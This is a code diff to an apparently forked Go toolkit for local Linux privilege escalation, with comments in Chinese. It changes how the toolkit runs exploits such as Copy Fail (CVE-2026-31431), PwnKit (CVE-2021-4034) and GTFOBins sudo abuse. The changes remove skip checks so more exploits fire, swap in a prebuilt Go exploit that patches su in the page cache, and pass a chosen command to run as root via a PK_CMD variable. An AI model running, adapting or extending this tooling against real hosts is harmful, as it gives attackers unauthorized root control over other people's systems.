@@ -176,14 +176,15 @@ type Exploit struct {
 // ── Toolkit ──────────────────────────────────────────────────────────────────
 
 type Toolkit struct {
-	verbose   bool
-	quiet     bool
-	command   string
-	skipped   map[string]bool
-	tmpDir    string
-	exploits  []Exploit
-	compiled  map[string]string
-	backupDir string
+	verbose    bool
+	quiet      bool
+	command    string
+	skipped    map[string]bool
+	tmpDir     string
+	exploits   []Exploit
+	compiled   map[string]string
+	backupDir  string
+	pkExecuted bool // fork: pwnkit 已通过 PK_CMD 以 root 执行过命令
 }
 
 func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *Toolkit {
@@ -213,15 +214,20 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 			CompileCmd:  []string{"gcc", "-O2", "-Wall", "-Wextra", "-std=gnu11", "-static"},
 		},
 		{
-			Name:        "copyfail",
-			Filename:    "copyfail.c",
-			Description: "CVE-2026-31431: Copy Fail - authencesn AF_ALG + splice page-cache write",
+			Name:     "copyfail",
+			Filename: "copyfail.c",
+			// [FORK] 使用 badsectorlabs copyfail-go 预编译二进制
+			// (vendor_bin/ 覆盖进 exploits/bin/<arch>/copyfail):
+			// 实测上游 C 版提权失败而 Go 版成功。Go 版裸跑即
+			// 打补丁 su, 与 isPageCachePwned 检测模型一致。
+			Description: "CVE-2026-31431: Copy Fail (copyfail-go) - AF_ALG + splice page-cache write",
 			Introduced:  "4.14",
 			FixedIn:     []string{"6.18.22", "6.19.12", "7.0"},
 			CompileCmd:  []string{"gcc", "-static", "-O2", "-s"},
-			SkipCheck: func() bool {
-				return !moduleAvailable("algif_aead") && !moduleAvailable("algif_skcipher")
-			},
+			Timeout: 120 * time.Second,
+			// [FORK] 删除上游的 algif 模块 SkipCheck: 模块内建于内核时
+			// /proc/modules 看不到 -> 误跳过(C 版很可能因此
+			// 根本没跑); Go 版对不可用的 AF_ALG 会自行快速失败。
 		},
 		{
 			Name:        "dirtydecrypt",
@@ -267,10 +273,9 @@ func NewToolkit(verbose, quiet bool, command string, skipped map[string]bool) *T
 			Description: "CVE-2021-4034: PwnKit - pkexec environment escape",
 			Introduced:  "2.6",
 			CompileCmd:  []string{"gcc", "-O2", "-static"},
-			SkipCheck: func() bool {
-				_, err := exec.LookPath("gcc")
-				return err != nil
-			},
+			// [FORK] 自包含 berdav 改版: 内嵌 pwnkit.so, 无需目标机 gcc,
+			// 删掉上游的 gcc SkipCheck (上游版即使预编译二进制已嵌入
+			// 也会因 SkipCheck 先于解包执行而被跳过)。
 			SuccessCheck: func() bool { return checkExploitMarker("cve_2021_4034") },
 		},
 		{
@@ -731,6 +736,10 @@ func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
 			cmd.Stdout = os.Stdout
 			cmd.Stderr = os.Stderr
 		}
+		// [FORK] 自包含 exploit(如 pwnkit)通过 PK_CMD 环境变量直接以
+		// root 执行命令, 免去后续 sudo 兜底(无 sudo 的机器也能完成
+		// -c 命令执行)。
+		cmd.Env = append(os.Environ(), "PK_CMD="+tk.command)
 	} else {
 		// Interactive mode: need stdout/stderr for shell interaction
 		cmd.Stdout = os.Stdout
@@ -754,7 +763,13 @@ func (tk *Toolkit) runExploit(exp Exploit, binary string) bool {
 			}
 			return false
 		}
-		return exp.SuccessCheck()
+		ok := exp.SuccessCheck()
+		// [FORK] pwnkit 已借 PK_CMD 执行过命令: 记录, 供 execCommandAsRoot
+		// 跳过重复执行 (sudo 兜底在无 sudo 机器上会再跑一遍并报错)。
+		if ok && exp.Name == "cve_2021_4034" && tk.command != "" {
+			tk.pkExecuted = true
+		}
+		return ok
 	}
 
 	// Default: check for page cache contamination
@@ -967,6 +982,13 @@ func (tk *Toolkit) Run() {
 // It tries several approaches: direct exec if we are root, or via patched SUID
 // binary (page-cache exploits), or via sudo.
 func (tk *Toolkit) execCommandAsRoot(exp Exploit) {
+	// [FORK] pwnkit 已通过 PK_CMD 以 root 执行过命令, 不再重复执行
+	// (重复执行无 sudo 机器上会走 sudo 兜底报错, 且命令链二次运行)。
+	if tk.pkExecuted && exp.Name == "cve_2021_4034" {
+		tk.say("[+] %s already executed the command as root via PK_CMD", exp.Name)
+		return
+	}
+
 	tk.say("[+] %s succeeded! Running command...", exp.Name)
 
 	// Try direct execution if already root
@@ -1302,6 +1324,11 @@ func handleGTFOBins(tk *Toolkit) bool {
 	}
 
 	cmd := exec.Command(sudoPath, "-n", "-l")
+	// [FORK] 无 sudo 机器上 sudo 自身的 "a password is required" 会直接
+	// 打到终端(Stderr 未接), -q 模式下吞掉噪声。
+	if tk.quiet {
+		cmd.Stderr = nil
+	}
 	output, err := cmd.Output()
 	if err != nil {
 		tk.log("sudo -n -l failed (no passwordless sudo?): %v", err)
